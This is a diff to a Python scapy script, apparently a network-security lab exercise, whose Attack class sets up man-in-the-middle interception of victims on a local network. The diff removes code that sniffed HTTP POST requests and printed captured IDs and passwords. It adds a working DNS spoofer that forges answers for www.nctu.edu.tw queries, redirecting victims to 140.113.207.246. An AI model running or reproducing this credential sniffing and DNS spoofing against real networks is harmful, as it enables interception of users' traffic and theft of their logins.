@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 import netifaces as ni
 import os
+from scapy.all import *
 import scapy.all as scapy
 from scapy.layers.http import HTTPRequest
+from scapy.layers.dns import DNS, DNSRR, DNSQR
 import time
 
 class Attack():
@@ -68,14 +70,17 @@ class Attack():
     
     def sniff_packets(self):
         for v in self.victim:
-            t = scapy.AsyncSniffer(filter='ether src ' + self.ip_mac[v], prn=self.process_packet, iface=self.interfaces[1], store=False)
+            t = scapy.AsyncSniffer(filter='udp dst port 53', prn=self.process_packet, iface=self.interfaces[1], store=0)
             t.start()
 
     def process_packet(self, packet):
-        print(packet.show())
-        if packet.haslayer(HTTPRequest) and packet[HTTPRequest].Method.decode() == 'POST':
-            print('ID and password', packet[scapy.Raw].load)
-            print('Came from', packet[scapy.Ether].src)
+        pkt = packet
+        if UDP in pkt and DNS in pkt:
+            qname = packet[DNSQR].qname
+            if b'www.nctu.edu.tw' in qname:
+                cap_domain = str(pkt[DNSQR].qname)[2:len(str(pkt[DNSQR].qname))-2]
+                fakeResponse = IP(dst=pkt[IP].src,src=pkt[IP].dst) / UDP(dport=pkt[UDP].sport,sport=53) / DNS(id=pkt[DNS].id,qd=pkt[DNS].qd,aa=1,qr=1, ancount=1,an=DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246') / DNSRR(rrname=pkt[DNSQR].qname,rdata='140.113.207.246'))
+                scapy.send(fakeResponse, verbose=0)
 
 attack = Attack()
 attack._enable_linux_iproute()
@@ -83,7 +88,7 @@ attack.get_ip()
 attack.get_mac(attack.network[1])
 for v in attack.victim:
     print('victim: ', v, 'mac: ', attack.ip_mac[v])
-#print(attack.interfaces, attack.ip_list, '\n', attack.ip_mac, '\n', attack.network)
+
 try:
     attack.sniff_packets()
     while 1:
